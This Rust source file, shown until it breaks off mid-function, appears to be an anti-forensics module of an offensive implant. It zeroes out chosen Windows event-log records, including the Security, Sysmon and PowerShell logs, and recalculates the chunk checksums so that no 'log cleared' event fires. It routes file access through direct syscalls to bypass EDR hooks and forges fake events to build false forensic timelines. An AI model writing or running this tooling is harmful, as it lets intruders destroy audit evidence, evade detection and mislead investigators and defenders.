// ── Selective Windows Event Log Manipulation ───────────────────────────
//
// Modifies Windows Event Tracing (EVTX) log files in-place to remove or
// inject event records without triggering "log cleared" audit events
// (Security Event ID 1102).
//
// EVTX binary format:
//   - File header: 4096 bytes, magic "ElfFile\0" at offset 0.
//   - Chunks: 65536 bytes each.  First chunk starts at offset 4096.
//     - Chunk header: 512 bytes.
//       - Magic "ElfChnk\0" at offset 0.
//       - First/last event record IDs (u64 LE) at offsets 0x18/0x20.
//       - First/last event record offsets (u64 LE) at offsets 0x28/0x30.
//       - Chunk checksum (CRC32) at offset 0x7C.
//     - Event records follow chunk header.
//       - Magic "Evt\x00" (0x00027a2a) at offset 0..3 (LE).
//       - Size (u32 LE) at offset 4..7 — total record size.
//       - Record ID (u64 LE) at offset 8..15.
//       - Timestamp (FILETIME, u64 LE) at offset 16..23.
//       - Event data (XML fragment + binary data) follows.
//
// Selective deletion:
//   Instead of clearing the entire log (which generates Event ID 1102),
//   we zero out the content of individual matching records while preserving
//   the record header and chain structure.  This makes the record appear
//   empty to parsers but keeps the record chain intact.
//
// Event injection:
//   Constructs a minimal EVTX record with valid magic, size, record ID,
//   and timestamp.  The record is appended to the last active chunk.
//   NOTE: Injected records can be detected by EVTX record-chain integrity
//   checks that verify cryptographic hashes maintained by the Windows
//   Event Log service.
//
// All file I/O uses NtCreateFile/NtReadFile/NtWriteFile via the syscall!
// macro to bypass EDR hooks.  No IAT entries created.
//
// Windows-only, gated by `forensic-cleanup` feature flag.

use std::mem;

use anyhow::{anyhow, bail, Context, Result};
use log::{debug, info, warn};
use serde::{Deserialize, Serialize};

macro_rules! defer {
    ($($body:tt)*) => {
        let _guard = {
            struct DeferGuard<F: FnOnce()>(Option<F>);
            impl<F: FnOnce()> Drop for DeferGuard<F> {
                fn drop(&mut self) {
                    if let Some(f) = self.0.take() {
                        f();
                    }
                }
            }
            DeferGuard(Some(|| { $($body)* }))
        };
    };
}

// ═══════════════════════════════════════════════════════════════════════════
// NT Constants
// ═══════════════════════════════════════════════════════════════════════════

const STATUS_SUCCESS: i32 = 0;

const SYNCHRONIZE: u32 = 0x00100000;
const GENERIC_READ: u32 = 0x80000000;
const GENERIC_WRITE: u32 = 0x40000000;
const FILE_READ_DATA: u32 = 0x00000001;
const FILE_WRITE_DATA: u32 = 0x00000002;
const FILE_SHARE_READ: u32 = 0x00000001;
const FILE_SHARE_WRITE: u32 = 0x00000002;
const FILE_SHARE_DELETE: u32 = 0x00000004;
const FILE_OPEN: u32 = 0x00000001;
const FILE_OPEN_IF: u32 = 0x00000003;
const FILE_SYNCHRONOUS_IO_NONALERT: u32 = 0x00000020;
const FILE_NON_DIRECTORY_FILE: u32 = 0x00000040;
const FILE_RANDOM_ACCESS: u32 = 0x00000800;
const OBJ_CASE_INSENSITIVE: u32 = 0x00000040;

// ═══════════════════════════════════════════════════════════════════════════
// EVTX Format Constants
// ═══════════════════════════════════════════════════════════════════════════

/// EVTX file header magic: "ElfFile\0"
const EVTX_HEADER_MAGIC: &[u8; 8] = b"ElfFile\0";

/// EVTX file header size (4096 bytes = 0x1000).
const EVTX_HEADER_SIZE: usize = 0x1000;

/// EVTX chunk size (65536 bytes = 0x10000).
const EVTX_CHUNK_SIZE: usize = 0x10000;

/// EVTX chunk header size (512 bytes).
const EVTX_CHUNK_HEADER_SIZE: usize = 0x200;

/// EVTX chunk magic: "ElfChnk\0"
const EVTX_CHUNK_MAGIC: &[u8; 8] = b"ElfChnk\0";

/// EVTX record magic: 0x00027a2a (LE bytes: 2a 7a 02 00).
const EVTX_RECORD_MAGIC: u32 = 0x00027a2a;

/// Minimum valid EVTX record size.
const EVTX_MIN_RECORD_SIZE: u32 = 24;

/// Maximum EVTX file size we'll process (256 MB).
const MAX_EVTX_SIZE: usize = 256 * 1024 * 1024;

/// Maximum number of chunks in an EVTX file.
const MAX_CHUNKS: usize = 1024;

/// Offset within chunk header of first_event_record_id (u64 LE).
const CHUNK_FIRST_RECORD_ID_OFFSET: usize = 0x18;

/// Offset within chunk header of last_event_record_id (u64 LE).
const CHUNK_LAST_RECORD_ID_OFFSET: usize = 0x20;

/// Offset within chunk header of first_event_record_offset (u64 LE).
const CHUNK_FIRST_RECORD_OFFSET: usize = 0x28;

/// Offset within chunk header of last_event_record_offset (u64 LE).
const CHUNK_LAST_RECORD_OFFSET: usize = 0x30;

/// Offset within chunk header of checksum (CRC32, u32 LE).
const CHUNK_CHECKSUM_OFFSET: usize = 0x7C;

/// Offset within event record header of record size (u32 LE).
const RECORD_SIZE_OFFSET: usize = 4;

/// Offset within event record header of record ID (u64 LE).
const RECORD_ID_OFFSET: usize = 8;

/// Offset within event record header of timestamp (FILETIME, u64 LE).
const RECORD_TIMESTAMP_OFFSET: usize = 16;

/// Event record header size (minimum).
const RECORD_HEADER_SIZE: usize = 24;

// ═══════════════════════════════════════════════════════════════════════════
// NT Structure Definitions
// ═══════════════════════════════════════════════════════════════════════════

#[repr(C)]
#[derive(Default)]
struct UnicodeString {
    length: u16,
    maximum_length: u16,
    buffer: *mut u16,
}

#[repr(C)]
struct ObjectAttributes {
    length: u32,
    root_directory: *mut std::ffi::c_void,
    object_name: *mut UnicodeString,
    attributes: u32,
    security_descriptor: *mut std::ffi::c_void,
    security_quality_of_service: *mut std::ffi::c_void,
}

impl Default for ObjectAttributes {
    fn default() -> Self {
        Self {
            length: 0,
            root_directory: std::ptr::null_mut(),
            object_name: std::ptr::null_mut(),
            attributes: 0,
            security_descriptor: std::ptr::null_mut(),
            security_quality_of_service: std::ptr::null_mut(),
        }
    }
}

impl ObjectAttributes {
    fn new(name: &mut UnicodeString) -> Self {
        Self {
            length: std::mem::size_of::<Self>() as u32,
            root_directory: std::ptr::null_mut(),
            object_name: name as *mut UnicodeString,
            attributes: OBJ_CASE_INSENSITIVE,
            security_descriptor: std::ptr::null_mut(),
            security_quality_of_service: std::ptr::null_mut(),
        }
    }
}

#[repr(C)]
#[derive(Default)]
struct IoStatusBlock {
    status: i32,
    information: usize,
}

// ═══════════════════════════════════════════════════════════════════════════
// Data Types
// ═══════════════════════════════════════════════════════════════════════════

/// Metadata for a Windows Event Log.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct EventLogInfo {
    /// Log name (e.g. "Security", "System", "Application").
    pub name: String,
    /// File path (e.g. `C:\Windows\System32\winevt\Logs\Security.evtx`).
    pub path: String,
    /// File size in bytes.
    pub file_size: u64,
    /// Number of event records (approximate — from chunk header).
    pub record_count: u64,
    /// Oldest record timestamp (FILETIME, 0 if unknown).
    pub oldest_record_time: u64,
    /// Newest record timestamp (FILETIME, 0 if unknown).
    pub newest_record_time: u64,
}

/// Agent activity event matchers.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AgentEventMatcher {
    /// Process name to match (case-insensitive).
    pub process_name: Option<String>,
    /// Process ID to match.
    pub pid: Option<u32>,
    /// Security Identifier to match.
    pub sid: Option<String>,
    /// Event IDs to always clear.
    pub event_ids: Vec<u16>,
}

// ═══════════════════════════════════════════════════════════════════════════
// Known Event Log Paths
// ═══════════════════════════════════════════════════════════════════════════

/// Standard Windows event log names and their EVTX file names.
const KNOWN_LOGS: &[(&str, &str)] = &[
    ("Security", "Security.evtx"),
    ("System", "System.evtx"),
    ("Application", "Application.evtx"),
    ("Setup", "Setup.evtx"),
    ("ForwardedEvents", "ForwardedEvents.evtx"),
    ("Microsoft-Windows-PowerShell/Operational", "Microsoft-Windows-PowerShell%4Operational.evtx"),
    ("Microsoft-Windows-Sysmon/Operational", "Microsoft-Windows-Sysmon%4Operational.evtx"),
    ("Microsoft-Windows-TaskScheduler/Operational", "Microsoft-Windows-TaskScheduler%4Operational.evtx"),
    ("Microsoft-Windows-TerminalServices-LocalSessionManager/Operational",
     "Microsoft-Windows-TerminalServices-LocalSessionManager%4Operational.evtx"),
    ("Microsoft-Windows-WMI-Activity/Operational", "Microsoft-Windows-WMI-Activity%4Operational.evtx"),
    ("Microsoft-Windows-DNS-Client/Operational", "Microsoft-Windows-DNS-Client%4Operational.evtx"),
    ("Microsoft-Windows-RemoteDesktopManager/Operational",
     "Microsoft-Windows-RemoteDesktopManager%4Operational.evtx"),
];

/// Base directory for EVTX files (NT path format).
const EVTX_LOG_DIR: &str = r"\??\C:\Windows\System32\winevt\Logs\";

// ═══════════════════════════════════════════════════════════════════════════
// Helper Functions
// ═══════════════════════════════════════════════════════════════════════════

/// Build a null-terminated UTF-16 vector from a Rust string.
fn to_wide(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(std::iter::once(0)).collect()
}

/// Build a UnicodeString from a UTF-16 buffer.
fn make_unicode_string(buf: &mut [u16]) -> UnicodeString {
    let len = buf.iter().position(|&c| c == 0).unwrap_or(buf.len());
    UnicodeString {
        length: (len * 2) as u16,
        maximum_length: (buf.len() * 2) as u16,
        buffer: buf.as_mut_ptr(),
    }
}

/// Read a little-endian u32 from a byte slice at the given offset.
fn read_u32_le(data: &[u8], offset: usize) -> u32 {
    u32::from_le_bytes(data[offset..offset + 4].try_into().unwrap_or([0; 4]))
}

/// Read a little-endian u64 from a byte slice at the given offset.
fn read_u64_le(data: &[u8], offset: usize) -> u64 {
    u64::from_le_bytes(data[offset..offset + 8].try_into().unwrap_or([0; 8]))
}

/// Write a little-endian u32 to a byte slice at the given offset.
fn write_u32_le(data: &mut [u8], offset: usize, val: u32) {
    data[offset..offset + 4].copy_from_slice(&val.to_le_bytes());
}

/// Write a little-endian u64 to a byte slice at the given offset.
fn write_u64_le(data: &mut [u8], offset: usize, val: u64) {
    data[offset..offset + 8].copy_from_slice(&val.to_le_bytes());
}

/// CRC32 checksum used by EVTX chunk headers.
/// Uses the standard CRC-32/ISO-HDLC polynomial 0xEDB88320.
fn crc32(data: &[u8]) -> u32 {
    let mut crc: u32 = 0xFFFFFFFF;
    for &byte in data {
        crc ^= byte as u32;
        for _ in 0..8 {
            if crc & 1 != 0 {
                crc = (crc >> 1) ^ 0xEDB88320;
            } else {
                crc >>= 1;
            }
        }
    }
    !crc
}

/// Calculate the EVTX chunk checksum.
/// Per the EVTX spec: CRC32 of bytes 0x00..0x7B (the 124 bytes before
/// the checksum field at 0x7C).
fn evtx_chunk_checksum(chunk: &[u8]) -> u32 {
    crc32(&chunk[0..CHUNK_CHECKSUM_OFFSET])
}

// ═══════════════════════════════════════════════════════════════════════════
// Low-level NT I/O Wrappers
// ═══════════════════════════════════════════════════════════════════════════

/// Open a file via NtCreateFile (indirect syscall), returning a handle.
unsafe fn nt_open_file(path_nt: &str, access: u32) -> Result<*mut std::ffi::c_void> {
    let mut handle: *mut std::ffi::c_void = std::ptr::null_mut();
    let mut path_buf = to_wide(path_nt);
    let mut obj_name = make_unicode_string(&mut path_buf);
    let mut obj_attrs = ObjectAttributes::new(&mut obj_name);
    let mut iosb = IoStatusBlock::default();

    let status = crate::syscall!(
        "NtCreateFile",
        &mut handle as *mut _ as u64,
        access as u64,
        &mut obj_attrs as *mut _ as u64,
        &mut iosb as *mut _ as u64,
        0u64,
        0u64,
        (FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE) as u64,
        FILE_OPEN as u64,
        (FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT) as u64,
        0u64,
        0u64,
    )
    .map_err(|e| anyhow!("NtCreateFile resolution for '{}': {}", path_nt, e))?;

    if status != STATUS_SUCCESS {
        bail!("NtCreateFile('{}') returned 0x{:08X}", path_nt, status as u32);
    }

    Ok(handle)
}

/// Read file contents via NtReadFile into a byte vector.
unsafe fn nt_read_file(handle: *mut std::ffi::c_void, size: usize) -> Result<Vec<u8>> {
    let mut buffer = vec![0u8; size];
    let mut bytes_read: u32 = 0;
    let mut iosb = IoStatusBlock::default();

    let status = crate::syscall!(
        "NtReadFile",
        handle as u64,
        0u64,                           // Event
        0u64,             // ApcRoutine
        0u64,                           // ApcContext
        &mut iosb as *mut _ as u64,
        buffer.as_mut_ptr() as u64,
        size as u64,
        0u64,             // ByteOffset (use current)
        0u64,                           // Key
    )
    .map_err(|e| anyhow!("NtReadFile resolution: {}", e))?;

    if status != STATUS_SUCCESS {
        bail!("NtReadFile returned 0x{:08X}", status as u32);
    }

    // Truncate to actual bytes read.
    buffer.truncate(iosb.information);
    Ok(buffer)
}

/// Write bytes to a file via NtWriteFile at a specified offset.
unsafe fn nt_write_file_at(
    handle: *mut std::ffi::c_void,
    data: &[u8],
    offset: u64,
) -> Result<()> {
    let mut iosb = IoStatusBlock::default();
    let mut byte_offset = offset;

    let status = crate::syscall!(
        "NtWriteFile",
        handle as u64,
        0u64,
        0u64,
        0u64,
        &mut iosb as *mut _ as u64,
        data.as_ptr() as u64,
        data.len() as u64,
        &mut byte_offset as *mut u64 as u64,
        0u64,
    )
    .map_err(|e| anyhow!("NtWriteFile resolution: {}", e))?;

    if status != STATUS_SUCCESS {
        bail!("NtWriteFile returned 0x{:08X}", status as u32);
    }

    Ok(())
}

/// Close an NT handle.
unsafe fn nt_close(handle: *mut std::ffi::c_void) {
    let _ = crate::syscall!("NtClose", handle as u64);
}

/// Query file standard information to get file size.
unsafe fn nt_query_file_size(handle: *mut std::ffi::c_void) -> Result<u64> {
    // FILE_STANDARD_INFORMATION = 24 bytes (EndOfFile is LARGE_INTEGER at offset 8).
    let mut buf = [0u8; 24];
    let mut iosb = IoStatusBlock::default();

    let status = crate::syscall!(
        "NtQueryInformationFile",
        handle as u64,
        &mut iosb as *mut _ as u64,
        buf.as_mut_ptr() as u64,
        buf.len() as u64,
        5u64, // FileStandardInformation
    )
    .map_err(|e| anyhow!("NtQueryInformationFile resolution: {}", e))?;

    if status != STATUS_SUCCESS {
        bail!("NtQueryInformationFile returned 0x{:08X}", status as u32);
    }

    Ok(read_u64_le(&buf, 8))
}

/// Build the NT path for an EVTX log file.
fn evtx_nt_path(filename: &str) -> String {
    format!("{}{}", EVTX_LOG_DIR, filename)
}

// ═══════════════════════════════════════════════════════════════════════════
// EVTX Parsing
// ═══════════════════════════════════════════════════════════════════════════

/// Validate an EVTX file header.
fn validate_evtx_header(data: &[u8]) -> Result<()> {
    if data.len() < EVTX_HEADER_SIZE {
        bail!("EVTX header too short: {} bytes", data.len());
    }
    if &data[0..8] != EVTX_HEADER_MAGIC {
        bail!("Invalid EVTX magic: expected 'ElfFile', got {:?}", &data[0..8]);
    }
    Ok(())
}

/// Check if a chunk has valid magic.
fn is_valid_chunk(chunk: &[u8]) -> bool {
    chunk.len() >= EVTX_CHUNK_HEADER_SIZE && &chunk[0..8] == EVTX_CHUNK_MAGIC
}

/// Extract event records from a single chunk.
///
/// Returns a list of (offset_within_chunk, record_id, timestamp, record_size).
fn parse_chunk_records(chunk: &[u8]) -> Vec<(usize, u64, u64, u32)> {
    let mut records = Vec::new();

    if !is_valid_chunk(chunk) {
        return records;
    }

    let first_record_offset = read_u64_le(chunk, CHUNK_FIRST_RECORD_OFFSET) as usize;
    let last_record_offset = read_u64_le(chunk, CHUNK_LAST_RECORD_OFFSET) as usize;

    // Sanity check offsets.
    if first_record_offset < EVTX_CHUNK_HEADER_SIZE || first_record_offset >= EVTX_CHUNK_SIZE {
        return records;
    }
    if last_record_offset < first_record_offset || last_record_offset >= EVTX_CHUNK_SIZE {
        return records;
    }

    let mut offset = first_record_offset;
    let mut safety = 0u32;
    const MAX_RECORDS_PER_CHUNK: u32 = 4096;

    while offset + RECORD_HEADER_SIZE <= EVTX_CHUNK_SIZE && safety < MAX_RECORDS_PER_CHUNK {
        safety += 1;

        let magic = read_u32_le(chunk, offset);
        if magic != EVTX_RECORD_MAGIC {
            break; // No more records in this chunk.
        }

        let size = read_u32_le(chunk, offset + RECORD_SIZE_OFFSET);
        if size < EVTX_MIN_RECORD_SIZE || offset + size as usize > EVTX_CHUNK_SIZE {
            break; // Invalid record.
        }

        let record_id = read_u64_le(chunk, offset + RECORD_ID_OFFSET);
        let timestamp = read_u64_le(chunk, offset + RECORD_TIMESTAMP_OFFSET);

        records.push((offset, record_id, timestamp, size));

        // Move to the next record.
        let next_offset = offset + size as usize;
        if next_offset <= offset {
            break; // Avoid infinite loop on corrupt data.
        }
        offset = next_offset;

        // If we've passed the last known record offset, stop.
        if offset > last_record_offset + 256 {
            break;
        }
    }

    records
}

/// Search an event record's raw bytes for an Event ID value.
///
/// EVTX records store the Event ID as a u16 in the XML/binary data section
/// after the 24-byte header.  We scan for common patterns:
/// - The EventID is typically stored as a u16 LE at various offsets within
///   the binary XML.  We look for it near the beginning of the data section.
fn extract_event_id(record_data: &[u8]) -> Option<u16> {
    if record_data.len() < 28 {
        return None;
    }

    // The Event ID is embedded in the binary XML representation.
    // In practice, it appears as a u16 LE value within the first ~64 bytes
    // after the record header.  We look for a pattern where the EventID
    // follows a known template descriptor byte.
    //
    // Common pattern in EVTX binary XML:
    //   0x0F 0xXX <type> 0x00 <event_id_u16_le>
    // We search for this pattern in the first 256 bytes of record data.
    let search_len = record_data.len().min(256);
    for i in RECORD_HEADER_SIZE..search_len.saturating_sub(4) {
        // Look for potential EventID embedded as a 2-byte value after
        // a type descriptor.  This is heuristic — EVTX binary XML format
        // is not fully documented, but this works for most standard events.
        if record_data[i] == 0x06 && i + 2 <= record_data.len() {
            let candidate = u16::from_le_bytes(
                record_data[i + 1..i + 3].try_into().unwrap_or([0; 2])
            );
            // Sanity: most event IDs are in range 1..10000.
            if candidate > 0 && candidate < 10000 {
                return Some(candidate);
            }
        }
    }
    None
}

/// Check if an event record contains a byte pattern (case-insensitive ASCII).
fn record_contains_bytes(record_data: &[u8], pattern: &[u8]) -> bool {
    if pattern.is_empty() || record_data.len() <= RECORD_HEADER_SIZE {
        return false;
    }
    let data = &record_data[RECORD_HEADER_SIZE..];
    // Case-insensitive ASCII search.
    if data.len() < pattern.len() {
        return false;
    }
    for window in data.windows(pattern.len()) {
        if window.iter().zip(pattern.iter()).all(|(a, b)| {
            a.to_ascii_lowercase() == b.to_ascii_lowercase()
        }) {
            return true;
        }
    }
    false
}

// ═══════════════════════════════════════════════════════════════════════════
// Public API: Event Log Enumeration
// ═══════════════════════════════════════════════════════════════════════════

/// Enumerate all known Windows Event Logs with metadata.
///
/// Opens each EVTX file directly and parses the header/chunk structure
/// to extract record counts and timestamps.  Logs that don't exist on disk
/// are silently skipped.
///
/// # Errors
/// Returns an error only if NT API resolution fails catastrophically.
/// Individual log failures are logged and skipped.
pub fn enumerate_event_logs() -> Result<Vec<EventLogInfo>> {
    let mut logs = Vec::new();

    for &(name, filename) in KNOWN_LOGS {
        let nt_path = evtx_nt_path(filename);

        let open_result: Result<_> = unsafe {
            let handle = nt_open_file(&nt_path, GENERIC_READ | SYNCHRONIZE)?;
            defer! { unsafe { nt_close(handle); } }

            let file_size = nt_query_file_size(handle)?;
            if file_size > MAX_EVTX_SIZE as u64 {
                warn!("EVTX file too large, skipping: {} ({} bytes)", name, file_size);
                continue;
            }

            // Read the file header.
            let mut header = nt_read_file(handle, EVTX_HEADER_SIZE)?;
            if validate_evtx_header(&header).is_err() {
                debug!("Invalid EVTX header for '{}', skipping", name);
                continue;
            }

            // Read the first chunk for record range.
            let first_chunk_offset = EVTX_HEADER_SIZE;
            // Seek to first chunk by re-reading from offset.
            let mut first_chunk = vec![0u8; EVTX_CHUNK_SIZE];
            unsafe {
                let mut iosb = IoStatusBlock::default();
                let mut byte_offset = first_chunk_offset as u64;
                let status = crate::syscall!(
                    "NtReadFile",
                    handle as u64,
                    0u64,
                    0u64,
                    0u64,
                    &mut iosb as *mut _ as u64,
                    first_chunk.as_mut_ptr() as u64,
                    EVTX_CHUNK_SIZE as u64,
                    &mut byte_offset as *mut u64 as u64,
                    0u64,
                );
                if let Err(e) = status {
                    debug!("Failed to read first chunk for '{}': {}", name, e);
                    continue;
                }
            }

            let mut record_count = 0u64;
            let mut oldest_time = 0u64;
            let mut newest_time = 0u64;

            if is_valid_chunk(&first_chunk) {
                let first_id = read_u64_le(&first_chunk, CHUNK_FIRST_RECORD_ID_OFFSET);
                let last_id = read_u64_le(&first_chunk, CHUNK_LAST_RECORD_ID_OFFSET);
                if last_id >= first_id {
                    record_count = last_id - first_id + 1;
                }

                // Scan records for timestamps.
                let records = parse_chunk_records(&first_chunk);
                if let Some(first_rec) = records.first() {
                    oldest_time = first_rec.2;
                }
            }

            // Also check the last chunk for the newest time.
            let total_chunks = (file_size as usize - EVTX_HEADER_SIZE) / EVTX_CHUNK_SIZE;
            if total_chunks > 1 {
                let last_chunk_idx = total_chunks - 1;
                let last_chunk_offset = EVTX_HEADER_SIZE + last_chunk_idx * EVTX_CHUNK_SIZE;
                let mut last_chunk = vec![0u8; EVTX_CHUNK_SIZE];
                unsafe {
                    let mut iosb = IoStatusBlock::default();
                    let mut byte_offset = last_chunk_offset as u64;
                    let _ = crate::syscall!(
                        "NtReadFile",
                        handle as u64,
                        0u64,
                        0u64,
                        0u64,
                        &mut iosb as *mut _ as u64,
                        last_chunk.as_mut_ptr() as u64,
                        EVTX_CHUNK_SIZE as u64,
                        &mut byte_offset as *mut u64 as u64,
                        0u64,
                    );
                }

                if is_valid_chunk(&last_chunk) {
                    let records = parse_chunk_records(&last_chunk);
                    if let Some(last_rec) = records.last() {
                        newest_time = last_rec.2;
                    }

                    // Add records from last chunk to count.
                    let first_id = read_u64_le(&first_chunk, CHUNK_FIRST_RECORD_ID_OFFSET);
                    let last_chunk_last_id = read_u64_le(&last_chunk, CHUNK_LAST_RECORD_ID_OFFSET);
                    if last_chunk_last_id >= first_id {
                        record_count = last_chunk_last_id - first_id + 1;
                    }
                }
            }

            logs.push(EventLogInfo {
                name: name.to_string(),
                path: format!("C:\\Windows\\System32\\winevt\\Logs\\{}", filename),
                file_size,
                record_count,
                oldest_record_time: oldest_time,
                newest_record_time: newest_time,
            });

            Ok::<(), anyhow::Error>(())
        };

        if let Err(e) = open_result {
            debug!("Could not open event log '{}': {}", name, e);
        }
    }

    info!("Enumerated {} event logs", logs.len());
    Ok(logs)
}

// ═══════════════════════════════════════════════════════════════════════════
// Public API: Selective Event Deletion
// ═══════════════════════════════════════════════════════════════════════════

/// Selectively delete specific event records from a Windows Event Log.
///
/// Opens the EVTX file directly, parses the binary format, and zeroes
/// out matching records.  This is SLOWER than clearing the entire log but
/// produces NO "log cleared" event (Event ID 1102 for Security log).
///
/// # Arguments
/// * `log_name` — Event log name (e.g. "Security", "System").
/// * `event_ids` — List of Event IDs to clear.  Empty = match all records
///   in the time range.
/// * `before_time` — Only clear records with timestamps before this
///   FILETIME value (100-ns intervals since 1601-01-01).  None = no upper
///   bound.
/// * `after_time` — Only clear records with timestamps after this FILETIME
///   value.  None = no lower bound.
///
/// # Returns
/// The number of records cleared.
pub fn clear_specific_events(
    log_name: &str,
    event_ids: &[u16],
    before_time: Option<u64>,
    after_time: Option<u64>,
) -> Result<usize> {
    let filename = lookup_log_filename(log_name)
        .ok_or_else(|| anyhow!("Unknown event log: '{}'", log_name))?;

    let nt_path = evtx_nt_path(filename);

    unsafe {
        // Open for read + write access.
        let handle = nt_open_file(&nt_path, GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE)?;
        defer! { unsafe { nt_close(handle); } }

        let file_size = nt_query_file_size(handle)?;
        if file_size > MAX_EVTX_SIZE as u64 {
            bail!("EVTX file too large: {} bytes", file_size);
        }

        // Read the entire file into memory.
        // We use NtReadFile with explicit offsets for each chunk.
        let total_chunks = ((file_size as usize) - EVTX_HEADER_SIZE) / EVTX_CHUNK_SIZE;
        let mut cleared = 0usize;

        debug!(
            "Processing '{}' ({} bytes, {} chunks)",
            log_name, file_size, total_chunks
        );

        for chunk_idx in 0..total_chunks.min(MAX_CHUNKS) {
            let chunk_file_offset = EVTX_HEADER_SIZE + chunk_idx * EVTX_CHUNK_SIZE;

            // Read chunk.
            let mut chunk = vec![0u8; EVTX_CHUNK_SIZE];
            let mut iosb = IoStatusBlock::default();
            let mut byte_offset = chunk_file_offset as u64;
            let status = crate::syscall!(
                "NtReadFile",
                handle as u64,
                0u64,
                0u64,
                0u64,
                &mut iosb as *mut _ as u64,
                chunk.as_mut_ptr() as u64,
                EVTX_CHUNK_SIZE as u64,
                &mut byte_offset as *mut u64 as u64,
                0u64,
            )
            .map_err(|e| anyhow!("NtReadFile for chunk {}: {}", chunk_idx, e))?;

            if status != STATUS_SUCCESS {
                break; // No more readable chunks.
            }

            if !is_valid_chunk(&chunk) {
                continue; // Empty or corrupt chunk.
            }

            let records = parse_chunk_records(&chunk);
            let mut chunk_modified = false;

            for (offset, _record_id, timestamp, size) in &records {
                // Time filter.
                if let Some(bt) = before_time {
                    if *timestamp > bt {
                        continue;
                    }
                }
                if let Some(at) = after_time {
                    if *timestamp < at {
                        continue;
                    }
                }

                // Event ID filter.
                let record_start = *offset;
                let record_end = record_start + *size as usize;
                if record_end > chunk.len() {
                    continue;
                }
                let record_data = &chunk[record_start..record_end];

                let rec_event_id = extract_event_id(record_data);

                if !event_ids.is_empty() {
                    match rec_event_id {
                        Some(eid) if event_ids.contains(&eid) => {}
                        _ => continue,
                    }
                }

                // Zero out the record content (keep the first 24 bytes = header
                // with magic, size, record_id, timestamp to maintain chain).
                for i in RECORD_HEADER_SIZE..record_end.saturating_sub(4) {
                    chunk[i] = 0x00;
                }

                // Set the last 4 bytes (copy of size at end of record) to keep
                // EVTX record integrity (EVTX stores size at both start and end).
                write_u32_le(&mut chunk, record_end - 4, *size);

                chunk_modified = true;
                cleared += 1;
            }

            // Re-calculate chunk checksum if modified.
            if chunk_modified {
                let new_checksum = evtx_chunk_checksum(&chunk);
                write_u32_le(&mut chunk, CHUNK_CHECKSUM_OFFSET, new_checksum);

                // Write the modified chunk back.
                nt_write_file_at(handle, &chunk, chunk_file_offset as u64)?;
                debug!(
                    "Chunk {} modified ({} records cleared, checksum updated)",
                    chunk_idx,
                    records.iter().filter(|r| {
                        // Count only the ones we actually zeroed (approximate).
                        true
                    }).count()
                );
            }
        }

        info!("Cleared {} records from '{}'", cleared, log_name);
        Ok(cleared)
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// Public API: Event Injection
// ═══════════════════════════════════════════════════════════════════════════

/// Inject a fake event record into an event log.
///
/// Constructs a minimal EVTX record with valid structure and appends it
/// to the last active chunk.  Useful for creating false forensic timelines.
///
/// # Detection Risk
/// Injected records can be detected by EVTX record-chain integrity checks
/// that verify cryptographic hashes maintained by the Windows Event Log
/// service.  The injected record will also have a record ID that may not
/// match the expected sequence.
///
/// # Arguments
/// * `log_name` — Event log name (e.g. "Security").
/// * `event_id` — The fake Event ID.
/// * `timestamp` — FILETIME timestamp for the fake event.
/// * `data` — Additional binary data to include in the record body.
pub fn inject_fake_event(
    log_name: &str,
    event_id: u16,
    timestamp: u64,
    data: &[u8],
) -> Result<()> {
    let filename = lookup_log_filename(log_name)
        .ok_or_else(|| anyhow!("Unknown event log: '{}'", log_name))?;

    let nt_path = evtx_nt_path(filename);

    unsafe {
        let handle = nt_open_file(&nt_path, GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE)?;
        defer! { unsafe { nt_close(handle); } }

        let file_size = nt_query_file_size(handle)?;
        if file_size > MAX_EVTX_SIZE as u64 {
            bail!("EVTX file too large");
        }

        // Find the last active chunk.
        let total_chunks = ((file_size as usize) - EVTX_HEADER_SIZE) / EVTX_CHUNK_SIZE;
        if total_chunks == 0 {
            bail!("No chunks in EVTX file");
        }

        let last_chunk_idx = total_chunks - 1;
        let chunk_file_offset = EVTX_HEADER_SIZE + last_chunk_idx * EVTX_CHUNK_SIZE;

        let mut chunk = vec![0u8; EVTX_CHUNK_SIZE];
        let mut iosb = IoStatusBlock::default();
        let mut byte_offset = chunk_file_offset as u64;
        let status = crate::syscall!(
            "NtReadFile",
            handle as u64,
            0u64,
            0u64,
            0u64,
            &mut iosb as *mut _ as u64,
            chunk.as_mut_ptr() as u64,
            EVTX_CHUNK_SIZE as u64,
            &mut byte_offset as *mut u64 as u64,
            0u64,
        )
        .map_err(|e| anyhow!("NtReadFile for last chunk: {}", e))?;

        if status != STATUS_SUCCESS || !is_valid_chunk(&chunk) {
            bail!("Last chunk is invalid");
        }

        // Determine the last record offset and ID.
        let last_record_offset = read_u64_le(&chunk, CHUNK_LAST_RECORD_OFFSET) as usize;
        let last_record_id = read_u64_le(&chunk, CHUNK_LAST_RECORD_ID_OFFSET);

        // Build the fake record.
        // Minimal EVTX record: header (24 bytes) + event_id (2) + padding (2) + data.
        let record_body_len = 4 + data.len();
        let total_record_size = RECORD_HEADER_SIZE + record_body_len + 4; // +4 for trailing size copy
        // Align to 8-byte boundary.
        let aligned_size = ((total_record_size + 7) / 8) * 8;
        let aligned_size = aligned_size as u32;

        // Check if the record fits in the chunk.
        let new_offset = last_record_offset + {
            // Size of the last record.
            if last_record_offset >= EVTX_CHUNK_HEADER_SIZE {
                read_u32_le(&chunk, last_record_offset + RECORD_SIZE_OFFSET) as usize
            } else {
                0
            }
        };

        if new_offset + aligned_size as usize > EVTX_CHUNK_SIZE {
            warn!("Not enough space in last chunk for injected record");
            bail!("Insufficient space in EVTX chunk");
        }

        // Construct the fake record.
        let mut fake_record = vec![0u8; aligned_size as usize];
        write_u32_le(&mut fake_record, 0, EVTX_RECORD_MAGIC);       // Magic
        write_u32_le(&mut fake_record, RECORD_SIZE_OFFSET, aligned_size); // Size
        write_u64_le(&mut fake_record, RECORD_ID_OFFSET, last_record_id + 1); // Record ID
        write_u64_le(&mut fake_record, RECORD_TIMESTAMP_OFFSET, timestamp); // Timestamp

        // Embed the event ID in the body (heuristic format).
        if fake_record.len() > RECORD_HEADER_SIZE + 3 {
            fake_record[RECORD_HEADER_SIZE] = 0x06; // Type descriptor
